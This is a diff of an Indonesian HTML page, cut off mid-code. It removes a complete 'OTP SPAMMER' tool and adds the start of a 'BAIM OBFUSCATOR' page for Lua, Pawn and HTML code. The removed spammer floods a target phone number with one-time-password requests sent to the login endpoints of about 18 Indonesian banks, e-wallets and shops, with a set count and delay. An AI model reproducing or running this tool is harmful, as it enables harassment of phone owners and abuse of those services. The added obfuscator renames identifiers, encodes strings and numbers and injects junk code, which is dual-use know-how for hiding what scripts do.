@@ -1,182 +1,1999 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 OTP SPAMMER</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:#0a0a0a;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-        .container{background:linear-gradient(145deg,#1a1a2e,#16213e);border-radius:20px;padding:30px;max-width:550px;width:100%;box-shadow:0 20px 60px rgba(255,0,0,.3);border:1px solid rgba(255,0,0,.2)}
-        .header{text-align:center;margin-bottom:25px}
-        .header h1{color:#ff0000;font-size:26px;text-shadow:0 0 20px rgba(255,0,0,.5)}
-        .header p{color:#888;font-size:13px;margin-top:6px}
-        .badge{display:inline-block;background:#ff0000;color:#fff;padding:3px 14px;border-radius:20px;font-size:11px;font-weight:bold;margin-top:6px;animation:pulse 1.5s infinite}
-        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.7}}
-        .input-group{margin-bottom:16px}
-        .input-group label{color:#aaa;font-size:13px;font-weight:600;display:block;margin-bottom:4px}
-        .input-group input,.input-group select{width:100%;padding:12px 16px;background:#0d0d1a;border:1px solid #2a2a4a;border-radius:10px;color:#fff;font-size:15px;transition:all .3s}
-        .input-group input:focus,.input-group select:focus{border-color:#ff0000;outline:none;box-shadow:0 0 20px rgba(255,0,0,.15)}
-        .input-row{display:flex;gap:10px}
-        .input-row .input-group{flex:1}
-        .btn{width:100%;padding:14px;background:linear-gradient(145deg,#ff0000,#cc0000);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;transition:all .3s;text-transform:uppercase;letter-spacing:1px}
-        .btn:hover{transform:scale(1.02);box-shadow:0 0 40px rgba(255,0,0,.4)}
-        .btn:active{transform:scale(.98)}
-        .btn:disabled{background:#333;cursor:not-allowed;transform:none;box-shadow:none}
-        .btn-stop{background:linear-gradient(145deg,#ff4444,#cc0000);margin-top:8px}
-        .status{margin-top:16px;padding:14px;background:#0d0d1a;border-radius:10px;border:1px solid #1a1a3a;max-height:180px;overflow-y:auto}
-        .status .log{color:#aaa;font-size:12px;font-family:'Courier New',monospace;line-height:1.8}
-        .status .log .success{color:#00ff88}
-        .status .log .error{color:#ff4444}
-        .status .log .info{color:#ffaa00}
-        .stats{display:flex;gap:12px;margin-top:14px;padding:14px;background:#0d0d1a;border-radius:10px;border:1px solid #1a1a3a}
-        .stats .stat-item{flex:1;text-align:center}
-        .stats .stat-item .number{color:#ff0000;font-size:22px;font-weight:bold}
-        .stats .stat-item .label{color:#666;font-size:11px;text-transform:uppercase}
-        .footer{text-align:center;margin-top:16px;color:#444;font-size:11px}
-        .status::-webkit-scrollbar{width:4px}
-        .status::-webkit-scrollbar-track{background:#0d0d1a}
-        .status::-webkit-scrollbar-thumb{background:#ff0000;border-radius:4px}
-        .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.1);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin-right:6px;vertical-align:middle}
-        @keyframes spin{to{transform:rotate(360deg)}}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="header">
-        <h1>🔥 OTP SPAMMER</h1>
-        <p>Real SMS OTP — Bukan Simulasi</p>
-        <span class="badge">⚠️ USE WITH CAUTION</span>
-    </div>
-    <div class="input-group">
-        <label>📱 Nomor Target</label>
-        <input type="text" id="targetNumber" placeholder="6281234567890" value="628">
-    </div>
-    <div class="input-row">
-        <div class="input-group">
-            <label>🔢 Jumlah</label>
-            <input type="number" id="spamCount" value="30" min="1" max="500">
-        </div>
-        <div class="input-group">
-            <label>⏱️ Delay (ms)</label>
-            <input type="number" id="delayMs" value="800" min="100" max="5000">
-        </div>
-    </div>
-    <div class="input-group">
-        <label>📡 Provider</label>
-        <select id="providerSelect">
-            <option value="all">🔀 ALL (MAX SPAM)</option>
-            <option value="grab">🚗 Grab</option>
-            <option value="gojek">🛵 Gojek</option>
-            <option value="shopee">🛍️ Shopee</option>
-            <option value="tokopedia">📦 Tokopedia</option>
-            <option value="ovo">💰 OVO</option>
-            <option value="dana">💳 DANA</option>
-            <option value="linkaja">🏦 LinkAja</option>
-            <option value="bca">🏧 BCA</option>
-            <option value="mandiri">🏧 Mandiri</option>
-            <option value="bni">🏧 BNI</option>
-            <option value="bri">🏧 BRI</option>
-            <option value="indomaret">🏪 Indomaret</option>
-            <option value="alfamart">🏪 Alfamart</option>
-            <option value="bukalapak">🛒 Bukalapak</option>
-            <option value="lazada">🛒 Lazada</option>
-            <option value="blibli">🛒 Blibli</option>
-            <option value="tiket">🎫 Tiket.com</option>
-            <option value="traveloka">✈️ Traveloka</option>
-        </select>
-    </div>
-    <button class="btn" id="startBtn">🚀 MULAI SPAM</button>
-    <button class="btn btn-stop" id="stopBtn" style="display:none;">⛔ STOP</button>
-    <div class="stats">
-        <div class="stat-item"><div class="number" id="sentCount">0</div><div class="label">Terkirim</div></div>
-        <div class="stat-item"><div class="number" id="successCount">0</div><div class="label">Berhasil</div></div>
-        <div class="stat-item"><div class="number" id="failCount">0</div><div class="label">Gagal</div></div>
-    </div>
-    <div class="status" id="logContainer">
-        <div class="log" id="logContent">
-            <span class="info">[✓] OTP SPAMMER READY</span><br>
-            <span class="info">[✓] Masukkan nomor dan mulai spam</span><br>
-        </div>
-    </div>
-    <div class="footer">🔥 CHRONOS — ~TUAN NICO~ EDITION</div>
-</div>
-<script>
-// ============================================================
-// 🔥 OTP SPAMMER — REAL ENGINE (OPTIMIZED)
-// ============================================================
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>BAIM OBFUSCATOR</title>
 
-const API_PROVIDERS = {
-    grab:{name:'Grab',endpoints:['https://api.grab.com/v1/auth/otp'],payload:n=>({phone:n,countryCode:'ID',type:'login'})},
-    gojek:{name:'Gojek',endpoints:['https://api.gojek.com/v1/auth/otp'],payload:n=>({phone_number:n,country_code:'62'})},
-    shopee:{name:'Shopee',endpoints:['https://api.shopee.com/v1/auth/otp'],payload:n=>({mobile:n,type:'login'})},
-    tokopedia:{name:'Tokopedia',endpoints:['https://api.tokopedia.com/v1/auth/otp'],payload:n=>({phone:n,channel:'sms'})},
-    ovo:{name:'OVO',endpoints:['https://api.ovo.id/v1/auth/otp'],payload:n=>({mobileNumber:n,type:'login'})},
-    dana:{name:'DANA',endpoints:['https://api.dana.id/v1/auth/otp'],payload:n=>({phone:n,countryCode:'62'})},
-    linkaja:{name:'LinkAja',endpoints:['https://api.linkaja.com/v1/auth/otp'],payload:n=>({phoneNumber:n})},
-    bca:{name:'BCA',endpoints:['https://api.bca.co.id/v1/auth/otp'],payload:n=>({msisdn:n})},
-    mandiri:{name:'Mandiri',endpoints:['https://api.mandiri.co.id/v1/auth/otp'],payload:n=>({phone:n})},
-    bni:{name:'BNI',endpoints:['https://api.bni.co.id/v1/auth/otp'],payload:n=>({phoneNumber:n})},
-    bri:{name:'BRI',endpoints:['https://api.bri.co.id/v1/auth/otp'],payload:n=>({no_hp:n})},
-    indomaret:{name:'Indomaret',endpoints:['https://api.indomaret.com/v1/auth/otp'],payload:n=>({phone:n})},
-    alfamart:{name:'Alfamart',endpoints:['https://api.alfamart.com/v1/auth/otp'],payload:n=>({phone:n})},
-    bukalapak:{name:'Bukalapak',endpoints:['https://api.bukalapak.com/v1/auth/otp'],payload:n=>({phone:n})},
-    lazada:{name:'Lazada',endpoints:['https://api.lazada.com/v1/auth/otp'],payload:n=>({mobile:n})},
-    blibli:{name:'Blibli',endpoints:['https://api.blibli.com/v1/auth/otp'],payload:n=>({phoneNumber:n})},
-    tiket:{name:'Tiket.com',endpoints:['https://api.tiket.com/v1/auth/otp'],payload:n=>({phone:n})},
-    traveloka:{name:'Traveloka',endpoints:['https://api.traveloka.com/v1/auth/otp'],payload:n=>({phoneNumber:n})}
-};
-
-let isRunning=false,sentCount=0,successCount=0,failCount=0,abortFlag=false;
-const targetNumber=document.getElementById('targetNumber'),spamCount=document.getElementById('spamCount');
-const delayMs=document.getElementById('delayMs'),providerSelect=document.getElementById('providerSelect');
-const startBtn=document.getElementById('startBtn'),stopBtn=document.getElementById('stopBtn');
-const sentCountEl=document.getElementById('sentCount'),successCountEl=document.getElementById('successCount');
-const failCountEl=document.getElementById('failCount'),logContent=document.getElementById('logContent');
-
-function log(msg,type='info'){const c={success:'#00ff88',error:'#ff4444',info:'#ffaa00'}[type]||'#aaa';logContent.innerHTML+=`<span style="color:${c}">${msg}</span><br>`;logContent.scrollTop=logContent.scrollHeight;}
-
-function validateNumber(n){let c=n.replace(/\D/g,'');if(!c.startsWith('62')){if(c.startsWith('0'))c='62'+c.substring(1);else c='62'+c;}return(c.length>=12&&c.length<=15)?c:null;}
-
-async function sendOTP(provider,n){const pd=API_PROVIDERS[provider];if(!pd)return false;for(const ep of pd.endpoints){try{const r=await fetch(ep,{method:'POST',headers:{'Content-Type':'application/json','User-Agent':'Mozilla/5.0'},body:JSON.stringify(pd.payload(n)),signal:AbortSignal.timeout(5000)});if(r.status!==500&&r.status!==503)return true;}catch(e){continue;}}return false;}
-
-function getProviders(s){return s==='all'?Object.keys(API_PROVIDERS):[s];}
-
-function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
-function updateStats(){sentCountEl.textContent=sentCount;successCountEl.textContent=successCount;failCountEl.textContent=failCount;}
-
-async function startSpam(){
-    const raw=targetNumber.value.trim(),number=validateNumber(raw);
-    if(!number){log('[✗] Nomor tidak valid! Format: 6281234567890','error');return;}
-    const count=parseInt(spamCount.value)||30,delay=parseInt(delayMs.value)||800,selected=providerSelect.value,providers=getProviders(selected);
-    if(!providers.length){log('[✗] Tidak ada provider!','error');return;}
-    isRunning=true;abortFlag=false;sentCount=0;successCount=0;failCount=0;updateStats();
-    startBtn.disabled=true;startBtn.textContent='⏳ SPAMMING...';stopBtn.style.display='block';
-    logContent.innerHTML='';log(`[✓] Target: ${number}`,'info');log(`[✓] Jumlah: ${count} | Delay: ${delay}ms`,'info');
-    log(`[✓] Provider: ${selected==='all'?'ALL':selected}`,'info');log(`[✓] ================================`,'info');
-    let sent=0;
-    while(sent<count&&!abortFlag){
-        const provider=providers[Math.floor(Math.random()*providers.length)];
-        const pname=API_PROVIDERS[provider]?.name||provider;
-        try{
-            const result=await sendOTP(provider,number);sent++;sentCount=sent;
-            if(result){successCount++;log(`[✓] #${sent} → ${pname} ✅ BERHASIL`,'success');}
-            else{failCount++;log(`[✗] #${sent} → ${pname} ❌ GAGAL`,'error');}
-            updateStats();
-        }catch(e){failCount++;log(`[✗] #${sent} → Error`,'error');updateStats();}
-        if(sent<count&&!abortFlag)await sleep(delay);
-    }
-    isRunning=false;startBtn.disabled=false;startBtn.textContent='🚀 MULAI SPAM';stopBtn.style.display='none';
-    log(abortFlag?'[✓] ⛔ DIHENTIKAN!':'[✓] ✅ SELESAI!',abortFlag?'error':'success');
-    log(`[✓] Total: ${sentCount} | Berhasil: ${successCount} | Gagal: ${failCount}`,'info');
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;width:100%;min-height:100%;font-family:Arial,Helvetica,sans-serif}
+body{
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:16px;
+    overflow-x:hidden;
+    background:#050607;
+    color:#fff;
+}
+.bg{position:fixed;inset:0;overflow:hidden;pointer-events:none}
+.grid{
+    position:absolute;
+    inset:-120px;
+    opacity:.13;
+    background-image:
+        linear-gradient(#fff 1px,transparent 1px),
+        linear-gradient(90deg,#fff 1px,transparent 1px);
+    background-size:44px 44px;
+    transform:perspective(500px) rotateX(60deg) scale(1.8);
+    transform-origin:center bottom;
+    animation:gridMove 9s linear infinite;
+}
+@keyframes gridMove{
+    from{background-position:0 0,0 0}
+    to{background-position:0 44px,44px 0}
+}
+.orb{
+    position:absolute;
+    width:350px;
+    height:350px;
+    border-radius:50%;
+    filter:blur(95px);
+    opacity:.13;
+    animation:float 8s ease-in-out infinite;
+}
+.orb.a{left:-150px;top:-130px;background:#8b5cf6}
+.orb.b{right:-150px;bottom:-130px;background:#00ff88;animation-delay:-4s}
+@keyframes float{
+    0%,100%{transform:translate(0,0) scale(1)}
+    50%{transform:translate(35px,-25px) scale(1.08)}
 }
 
-function stopSpam(){if(isRunning){abortFlag=true;log('[✓] ⛔ Menghentikan...','error');}}
+.card{
+    position:relative;
+    z-index:2;
+    width:min(660px,100%);
+    padding:30px;
+    border:1px solid rgba(255,255,255,.12);
+    border-radius:32px;
+    background:rgba(247,247,250,.97);
+    color:#202027;
+    box-shadow:0 30px 100px rgba(0,0,0,.65);
+    animation:cardIn .7s cubic-bezier(.2,.8,.2,1);
+}
+@keyframes cardIn{
+    from{opacity:0;transform:translateY(30px) scale(.96)}
+    to{opacity:1;transform:none}
+}
 
-startBtn.addEventListener('click',startSpam);stopBtn.addEventListener('click',stopSpam);
-targetNumber.addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>0&&!v.startsWith('62')){if(v.startsWith('0'))v='62'+v.substring(1);else if(v.length<12){}else v='62'+v;}this.value=v;});
-log('[✓] 🔥 OTP SPAMMER READY','success');log('[✓] Gunakan dengan bijak!','info');
-console.log('%c🔥 OTP SPAMMER BY CHRONOS','font-size:18px;color:#ff0000;');
+.brand{
+    text-align:center;
+    font-size:clamp(29px,8vw,46px);
+    font-weight:950;
+    letter-spacing:-2.5px;
+    line-height:1;
+    user-select:none;
+}
+.brand span{
+    display:inline-block;
+    animation:glitch 4s infinite;
+}
+@keyframes glitch{
+    0%,92%,100%{transform:none;text-shadow:none}
+    93%{transform:translate(-3px,1px);text-shadow:3px 0 #8b5cf6}
+    94%{transform:translate(3px,-1px);text-shadow:-3px 0 #00d084}
+    95%{transform:none}
+}
+.line{
+    height:1px;
+    margin:26px 4px 24px;
+    background:linear-gradient(90deg,transparent,#aaa,transparent);
+}
+
+.drop{
+    position:relative;
+    min-height:160px;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    border-radius:25px;
+    background:#18171e;
+    color:#fff;
+    cursor:pointer;
+    overflow:hidden;
+    border:1px solid transparent;
+    transition:.25s ease;
+}
+.drop:hover{
+    transform:translateY(-4px);
+    box-shadow:0 16px 36px rgba(0,0,0,.22);
+    border-color:#ffffff18;
+}
+.drop:active{transform:scale(.985)}
+.drop:before{
+    content:"";
+    position:absolute;
+    inset:0;
+    background:linear-gradient(
+        115deg,
+        transparent 25%,
+        rgba(255,255,255,.08) 50%,
+        transparent 75%
+    );
+    transform:translateX(-120%);
+    animation:shine 3s infinite;
+}
+@keyframes shine{
+    0%,45%{transform:translateX(-120%)}
+    70%,100%{transform:translateX(120%)}
+}
+.drop:after{
+    content:"";
+    position:absolute;
+    top:0;
+    left:-80%;
+    width:50%;
+    height:2px;
+    background:#fff4;
+    animation:scan 3s infinite;
+}
+@keyframes scan{
+    0%,55%{left:-80%}
+    80%,100%{left:130%}
+}
+.icon{
+    width:52px;
+    height:52px;
+    margin-bottom:10px;
+    border-radius:16px;
+    display:grid;
+    place-items:center;
+    background:#292731;
+    font-size:25px;
+    position:relative;
+    z-index:2;
+}
+.drop b,.drop small{
+    position:relative;
+    z-index:2;
+}
+.drop b{font-size:20px}
+.drop small{margin-top:7px;color:#999}
+input[type=file]{display:none}
+
+.file{
+    min-height:22px;
+    margin:13px 8px 18px;
+    text-align:center;
+    font-size:13px;
+    color:#777;
+    white-space:nowrap;
+    overflow:hidden;
+    text-overflow:ellipsis;
+}
+
+.start{
+    width:100%;
+    padding:18px;
+    border:0;
+    border-radius:27px;
+    background:#292731;
+    color:#fff;
+    font-size:18px;
+    font-weight:800;
+    cursor:pointer;
+    position:relative;
+    overflow:hidden;
+    transition:.2s;
+}
+.start:hover{
+    background:#1e1d25;
+    transform:translateY(-2px);
+    box-shadow:0 12px 28px rgba(0,0,0,.22);
+}
+.start:active{transform:scale(.98)}
+.start.loading{
+    pointer-events:none;
+    opacity:.7;
+}
+.start.loading:after{
+    content:"";
+    position:absolute;
+    left:-45%;
+    top:0;
+    width:40%;
+    height:100%;
+    background:#fff2;
+    animation:loading 1s infinite;
+}
+@keyframes loading{
+    from{transform:translateX(0)}
+    to{transform:translateX(370%)}
+}
+
+details{
+    margin-top:17px;
+    border:1px solid #dedee3;
+    border-radius:21px;
+    overflow:hidden;
+    background:#fff;
+}
+summary{
+    padding:17px 19px;
+    cursor:pointer;
+    font-weight:800;
+    list-style:none;
+    user-select:none;
+}
+summary::-webkit-details-marker{display:none}
+summary:before{
+    content:"›";
+    display:inline-block;
+    margin-right:9px;
+    transition:.2s;
+}
+details[open] summary:before{transform:rotate(90deg)}
+.options{
+    padding:5px 19px 17px;
+    border-top:1px solid #eee;
+}
+.option{
+    display:flex;
+    align-items:center;
+    gap:11px;
+    padding:9px 0;
+    color:#555;
+    font-size:14px;
+    cursor:pointer;
+}
+.option input{
+    width:18px;
+    height:18px;
+    margin:0;
+    accent-color:#292731;
+}
+.status{
+    min-height:18px;
+    margin-top:17px;
+    text-align:center;
+    color:#999;
+    font-size:11px;
+    letter-spacing:1px;
+}
+.footer{
+    margin-top:9px;
+    text-align:center;
+    font-size:9px;
+    color:#aaa;
+    letter-spacing:3px;
+}
+.success{animation:success .45s ease}
+@keyframes success{
+    50%{transform:scale(1.025)}
+}
+
+@media(max-width:520px){
+    body{padding:12px}
+    .card{
+        padding:21px;
+        border-radius:27px;
+    }
+    .drop{min-height:145px}
+}
+</style>
+</head>
+
+<body>
+
+<div class="bg">
+    <div class="grid"></div>
+    <div class="orb a"></div>
+    <div class="orb b"></div>
+</div>
+
+<main class="card" id="card">
+
+    <div class="brand">
+        <span>BAIM OBFUSCATOR</span>
+    </div>
+
+    <div class="line"></div>
+
+    <label class="drop" id="drop" for="picker">
+        <div class="icon">↑</div>
+        <b>Pilih file</b>
+        <small>Lua / Pawn / HTML</small>
+    </label>
+
+    <input
+        id="picker"
+        type="file"
+        accept=".lua,.pwn,.inc,.html,.htm,.txt"
+    >
+
+    <div class="file" id="fileName">—</div>
+
+    <button
+        class="start"
+        id="start"
+        type="button"
+    >Start</button>
+
+    <details>
+        <summary>Pengaturan obfuscation</summary>
+
+        <div class="options">
+
+            <label class="option">
+                <input id="comments" type="checkbox" checked>
+                <span>Hapus komentar</span>
+            </label>
+
+            <label class="option">
+                <input id="strings" type="checkbox" checked>
+                <span>Obfuscate string</span>
+            </label>
+
+            <label class="option">
+                <input id="names" type="checkbox" checked>
+                <span>Acak local identifier</span>
+            </label>
+
+            <label class="option">
+                <input id="minify" type="checkbox" checked>
+                <span>Minify source</span>
+            </label>
+
+            <label class="option">
+                <input id="junk" type="checkbox" checked>
+                <span>Tambah layer runtime</span>
+            </label>
+
+            <!-- Opsi tambahan gacor -->
+            <label class="option">
+                <input id="numObf" type="checkbox" checked>
+                <span>Enkripsi angka</span>
+            </label>
+
+            <label class="option">
+                <input id="junkObf" type="checkbox" checked>
+                <span>Suntik kode sampah</span>
+            </label>
+
+        </div>
+    </details>
+
+    <div class="status" id="status">
+        BAIM OBFUSCATOR
+    </div>
+
+    <div class="footer">
+        BAIM OBFUSCATOR
+    </div>
+
+</main>
+
+<script>
+"use strict";
+
+const $ = id => document.getElementById(id);
+
+let selectedFile = null;
+
+/* =========================================================
+   RANDOM IDENTIFIER
+========================================================= */
+
+function randomIdentifier(){
+
+    const chars =
+        "IlOoXxZzVvQqAaBbCcDdEeFf";
+
+    let result = "_";
+
+    for(let i = 0; i < 20; i++){
+
+        result += chars[
+            Math.floor(
+                Math.random() * chars.length
+            )
+        ];
+    }
+
+    return result;
+}
+
+function escapeRegExp(text){
+
+    return text.replace(
+        /[.*+?^${}()|[\]\\]/g,
+        "\\$&"
+    );
+}
+
+/* =========================================================
+   FILE
+========================================================= */
+
+$("picker").addEventListener(
+    "change",
+    function(){
+
+        selectedFile =
+            this.files &&
+            this.files.length
+                ? this.files[0]
+                : null;
+
+        showFile();
+    }
+);
+
+function showFile(){
+
+    $("fileName").textContent =
+        selectedFile
+            ? selectedFile.name
+            : "—";
+}
+
+/* =========================================================
+   LUA LEXER
+   Menjaga string / long string / identifier
+========================================================= */
+
+function lexLua(source){
+
+    const tokens = [];
+
+    let i = 0;
+
+    function push(type,value){
+        tokens.push({
+            type:type,
+            value:value
+        });
+    }
+
+    while(i < source.length){
+
+        const c = source[i];
+
+        /* whitespace */
+
+        if(/\s/.test(c)){
+
+            let j = i + 1;
+
+            while(
+                j < source.length &&
+                /\s/.test(source[j])
+            ){
+                j++;
+            }
+
+            push("space",source.slice(i,j));
+
+            i = j;
+            continue;
+        }
+
+        /* comments */
+
+        if(
+            c === "-" &&
+            source[i + 1] === "-"
+        ){
+
+            /* long comment */
+
+            if(
+                source[i + 2] === "[" &&
+                source[i + 3] === "["
+            ){
+
+                const end =
+                    source.indexOf(
+                        "]]",
+                        i + 4
+                    );
+
+                if(end !== -1){
+
+                    push(
+                        "comment",
+                        source.slice(
+                            i,
+                            end + 2
+                        )
+                    );
+
+                    i = end + 2;
+                    continue;
+                }
+            }
+
+            let j =
+                source.indexOf(
+                    "\n",
+                    i + 2
+                );
+
+            if(j === -1)
+                j = source.length;
+
+            push(
+                "comment",
+                source.slice(i,j)
+            );
+
+            i = j;
+            continue;
+        }
+
+        /* quoted strings */
+
+        if(c === "'" || c === '"'){
+
+            const quote = c;
+
+            let j = i + 1;
+
+            while(j < source.length){
+
+                if(source[j] === "\\"){
+
+                    j += 2;
+                    continue;
+                }
+
+                if(source[j] === quote){
+
+                    j++;
+                    break;
+                }
+
+                j++;
+            }
+
+            push(
+                "string",
+                source.slice(i,j)
+            );
+
+            i = j;
+            continue;
+        }
+
+        /* Lua long strings */
+
+        if(
+            c === "[" &&
+            source[i + 1] === "["
+        ){
+
+            const end =
+                source.indexOf(
+                    "]]",
+                    i + 2
+                );
+
+            if(end !== -1){
+
+                push(
+                    "string",
+                    source.slice(
+                        i,
+                        end + 2
+                    )
+                );
+
+                i = end + 2;
+                continue;
+            }
+        }
+
+        /* identifier */
+
+        if(
+            /[A-Za-z_]/.test(c)
+        ){
+
+            let j = i + 1;
+
+            while(
+                j < source.length &&
+                /[A-Za-z0-9_]/.test(
+                    source[j]
+                )
+            ){
+                j++;
+            }
+
+            push(
+                "identifier",
+                source.slice(i,j)
+            );
+
+            i = j;
+            continue;
+        }
+
+        /* number */
+
+        if(/[0-9]/.test(c)){
+
+            let j = i + 1;
+
+            while(
+                j < source.length &&
+                /[A-Za-z0-9_.]/.test(
+                    source[j]
+                )
+            ){
+                j++;
+            }
+
+            push(
+                "number",
+                source.slice(i,j)
+            );
+
+            i = j;
+            continue;
+        }
+
+        /* operator / punctuation */
+
+        let op =
+            source.slice(i,i + 3);
+
+        if(
+            op === "..." ||
+            op === ">>=" ||
+            op === "<<="
+        ){
+
+            push("symbol",op);
+            i += 3;
+            continue;
+        }
+
+        op =
+            source.slice(i,i + 2);
+
+        if(
+            [
+                "==",
+                "~=",
+                "<=",
+                ">=",
+                "..",
+                "//",
+                "<<",
+                ">>",
+                "+=",
+                "-=",
+                "*=",
+                "/=",
+                "%="
+            ].includes(op)
+        ){
+
+            push("symbol",op);
+            i += 2;
+            continue;
+        }
+
+        push("symbol",c);
+
+        i++;
+    }
+
+    return tokens;
+}
+
+/* =========================================================
+   LUA STRING ENCODER (ditingkatkan)
+   Menggunakan variabel lokal _d = string.char
+   dan memecah string menjadi potongan acak.
+========================================================= */
+
+function decodeLuaString(raw){
+
+    if(
+        raw.startsWith("[[") &&
+        raw.endsWith("]]")
+    ){
+
+        return raw.slice(2,-2);
+    }
+
+    let value = raw.slice(1,-1);
+
+    value =
+        value.replace(
+            /\\([\\'"nrtbfv])/g,
+            function(_,c){
+
+                const map = {
+                    "\\":"\\",
+                    "'":"'",
+                    '"':'"',
+                    n:"\n",
+                    r:"\r",
+                    t:"\t",
+                    b:"\b",
+                    f:"\f",
+                    v:"\v"
+                };
+
+                return map[c] ?? c;
+            }
+        );
+
+    value =
+        value.replace(
+            /\\([0-9]{1,3})/g,
+            function(_,n){
+                return String.fromCharCode(
+                    parseInt(n,10)
+                );
+            }
+        );
+
+    return value;
+}
+
+function obfuscateLuaString(raw){
+
+    const value =
+        decodeLuaString(raw);
+
+    if(!value.length)
+        return '""';
+
+    const codes = [];
+
+    for(
+        let i = 0;
+        i < value.length;
+        i++
+    ){
+
+        codes.push(
+            value.charCodeAt(i)
+        );
+    }
+
+    /*
+     * Pecah menjadi kelompok acak 1-4 karakter
+     * lalu gabung dengan .. agar lebih berantakan.
+     */
+    const pieces = [];
+
+    let i = 0;
+
+    while(i < codes.length){
+
+        const chunkSize =
+            1 + Math.floor(
+                Math.random() * 4
+            );
+
+        const chunk =
+            codes.slice(
+                i,
+                i + chunkSize
+            );
+
+        if(chunk.length){
+
+            pieces.push(
+                "_d(" +
+                chunk.join(",") +
+                ")"
+            );
+        }
+
+        i += chunkSize;
+    }
+
+    if(pieces.length === 1)
+        return pieces[0];
+
+    return "(" +
+        pieces.join("..") +
+        ")";
+}
+
+/* =========================================================
+   LUA NUMBER OBFUSCATION
+   Mengubah angka sederhana menjadi ekspresi acak.
+========================================================= */
+
+function obfuscateLuaNumber(numStr){
+
+    const num = Number(numStr);
+
+    if(
+        isNaN(num) ||
+        !isFinite(num) ||
+        numStr.includes(".") ||
+        numStr.length > 4 ||
+        Math.abs(num) < 2 ||
+        Math.abs(num) > 10000
+    ){
+        return numStr;
+    }
+
+    const options = [
+        `(${num*2}/2)`,
+        `(${num+1}-1)`,
+        `(${num-1}+1)`,
+        `(${num*3}/3)`
+    ];
+
+    // Untuk angka bulat, tambahkan variasi lebih banyak
+    if(Number.isInteger(num)){
+
+        options.push(
+            `(${Math.floor(num/2)}*2+${num%2})`,
+            `(${Math.ceil(num/2)}*2-${(2 - num%2)%2})`
+        );
+    }
+
+    return options[
+        Math.floor(
+            Math.random() * options.length
+        )
+    ];
+}
+
+/* =========================================================
+   LUA RESERVED / GLOBAL
+========================================================= */
+
+const LUA_RESERVED = new Set([
+    "and",
+    "break",
+    "do",
+    "else",
+    "elseif",
+    "end",
+    "false",
+    "for",
+    "function",
+    "goto",
+    "if",
+    "in",
+    "local",
+    "nil",
+    "not",
+    "or",
+    "repeat",
+    "return",
+    "then",
+    "true",
+    "until",
+    "while"
+]);
+
+const LUA_GLOBALS = new Set([
+    "_G",
+    "_ENV",
+    "self",
+
+    "assert",
+    "collectgarbage",
+    "dofile",
+    "error",
+    "getmetatable",
+    "ipairs",
+    "load",
+    "loadfile",
+    "next",
+    "pairs",
+    "pcall",
+    "print",
+    "rawequal",
+    "rawget",
+    "rawlen",
+    "rawset",
+    "require",
+    "select",
+    "setmetatable",
+    "tonumber",
+    "tostring",
+    "type",
+    "xpcall",
+
+    "coroutine",
+    "debug",
+    "io",
+    "math",
+    "os",
+    "package",
+    "string",
+    "table",
+    "utf8"
+]);
+
+/* =========================================================
+   LUA LOCAL RENAMER
+   Token based, bukan replace seluruh source.
+========================================================= */
+
+function obfuscateLuaLocals(tokens){
+
+    const scopes = [
+        new Map()
+    ];
+
+    const used = new Set();
+
+    function newName(){
+
+        let name;
+
+        do{
+            name =
+                randomIdentifier();
+        }while(used.has(name));
+
+        used.add(name);
+
+        return name;
+    }
+
+    function find(name){
+
+        for(
+            let i = scopes.length - 1;
+            i >= 0;
+            i--
+        ){
+
+            if(
+                scopes[i].has(name)
+            ){
+                return scopes[i].get(name);
+            }
+        }
+
+        return null;
+    }
+
+    function declare(name){
+
+        if(
+            LUA_RESERVED.has(name) ||
+            LUA_GLOBALS.has(name)
+        ){
+            return name;
+        }
+
+        if(
+            scopes[scopes.length - 1]
+                .has(name)
+        ){
+            return scopes[
+                scopes.length - 1
+            ].get(name);
+        }
+
+        const n = newName();
+
+        scopes[
+            scopes.length - 1
+        ].set(name,n);
+
+        return n;
+    }
+
+    /*
+     * Cari deklarasi local.
+     */
+
+    for(let i = 0; i < tokens.length; i++){
+
+        const token = tokens[i];
+
+        if(
+            token.type === "identifier" &&
+            token.value === "local"
+        ){
+
+            let j = i + 1;
+
+            /*
+             * local function foo(...)
+             */
+
+            if(
+                tokens[j] &&
+                tokens[j].type === "identifier" &&
+                tokens[j].value === "function"
+            ){
+
+                j++;
+
+                if(
+                    tokens[j] &&
+                    tokens[j].type === "identifier"
+                ){
+
+                    /*
+                     * Nama function local
+                     * ikut dibuat lokal.
+                     */
+
+                    const old =
+                        tokens[j].value;
+
+                    tokens[j].value =
+                        declare(old);
+                }
+
+                continue;
+            }
+
+            /*
+             * local a,b,c
+             */
+
+            while(j < tokens.length){
+
+                const t = tokens[j];
+
+                if(
+                    t.type === "identifier"
+                ){
+
+                    t.value =
+                        declare(t.value);
+
+                    j++;
+                    continue;
+                }
+
+                if(
+                    t.value === ","
+                ){
+
+                    j++;
+                    continue;
+                }
+
+                break;
+            }
+        }
+    }
+
+    /*
+     * Parameter function.
+     */
+
+    for(let i = 0; i < tokens.length; i++){
+
+        if(
+            tokens[i].type === "identifier" &&
+            tokens[i].value === "function"
+        ){
+
+            let j = i + 1;
+
+            while(
+                j < tokens.length &&
+                tokens[j].value !== "("
+            ){
+                j++;
+            }
+
+            if(
+                j >= tokens.length
+            ){
+                continue;
+            }
+
+            let depth = 1;
+            j++;
+
+            scopes.push(new Map());
+
+            while(
+                j < tokens.length &&
+                depth > 0
+            ){
+
+                if(
+                    tokens[j].value === "("
+                ){
+                    depth++;
+                }
+
+                if(
+                    tokens[j].value === ")"
+                ){
+                    depth--;
+                }
+
+                if(
+                    depth === 1 &&
+                    tokens[j].type === "identifier"
+                ){
+
+                    const previous =
